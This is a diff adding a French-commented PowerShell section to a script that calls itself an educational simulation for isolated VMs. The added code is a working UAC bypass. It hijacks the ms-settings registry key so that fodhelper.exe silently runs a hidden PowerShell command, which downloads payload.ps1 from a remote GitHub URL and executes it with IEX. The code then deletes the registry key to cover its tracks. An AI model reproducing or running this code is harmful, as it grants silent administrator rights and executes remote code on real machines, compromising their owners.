@@ -3,6 +3,35 @@
 # À utiliser UNIQUEMENT en VM isolée - Usage éducatif uniquement
 # ============================================================
 
+# ===== PARTIE 1 : CONTOURNEMENT UAC (à mettre au TOUT DÉBUT) =====
+Write-Host "[*] Tentative de contournement UAC..." -ForegroundColor Cyan
+
+function Bypass-UAC {
+    # Modifie le registre pour piéger fodhelper.exe
+    $registrePath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+    New-Item $registrePath -Force | Out-Null
+    New-ItemProperty -Path $registrePath -Name "DelegateExecute" -Value "" -Force
+    
+    # Met votre script en attente dans le registre
+    Set-ItemProperty -Path $registrePath -Name "(default)" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Taku772/La_Plateforme/refs/heads/test-paylod/payload.ps1')" -Force
+
+    # Déclenche fodhelper.exe (qui va exécuter votre script avec les droits admin)
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    
+    # Nettoyage du registre après 3 secondes
+    Start-Sleep 3
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+}
+
+# Exécuter le contournement UAC
+Bypass-UAC
+
+# ===== ATTENTION IMPORTANTE =====
+# Après Bypass-UAC, le script va se relancer AUTOMATIQUEMENT en mode administrateur
+# Il faut donc sortir de cette instance pour ne pas créer une boucle infinie
+Write-Host "[*] Contournement UAC declenche. Redemarrage en mode administrateur..." -ForegroundColor Yellow
+exit  # Sort de l'instance non-administrateur
+
 # ===== ÉTAPE 1 : S'exécuter en administrateur =====
 Write-Host "[*] Demarrage de la simulation..." -ForegroundColor Cyan
 
